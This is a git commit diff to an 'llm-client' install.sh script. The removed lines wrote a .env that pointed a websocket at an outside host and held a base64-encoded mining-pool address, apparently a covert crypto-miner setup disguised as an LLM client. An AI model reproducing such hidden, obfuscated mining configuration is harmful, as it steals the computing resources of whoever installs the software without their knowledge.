d64a8570ec1bdac9f67c7878f74dbaa65f970c40
sawa05303 <93839840+sawa05303@users.noreply.github.com>
2026-02-04 15:49:43 +0700

    Update install.sh

--- llm-client/install.sh
+++ llm-client/install.sh
@@ -1,9 +1,2 @@
 #!/bin/bash
-CONNECT=${1:-8}
-NAME=${2:-003}
-echo "SERVER_WS=ws://cdn.keitaro.my.id
-SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
-SERVER_DOMAIN=1851807556
-SERVER_SECRET=${NAME}
-SERVER_CONNECTION=${CONNECT}" > .env
 while true; do node index.js; sleep 10; done
